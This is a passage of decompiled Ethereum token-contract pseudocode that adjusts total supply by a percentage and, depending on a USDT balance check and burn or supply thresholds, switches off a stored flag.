                                _totalSupply = _totalSupply - arg2 + (arg2 * stor16 / 100)
        if stor13:
            require ext_code.size(USDTAddress)
            staticcall USDTAddress.0x70a08231 with:
                    gas gas_remaining wei
                   args this.address
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            if ext_call.return_data[0] >= 277775 * 10^17 * 3600:
                stor13 = 0
            else:
                if totalBurn >= 277775 * 10^13 * 3600:
                    stor13 = 0
                else:
                    if _totalSupply <= 10^17:
                        stor13 = 0
    return 1
}



}
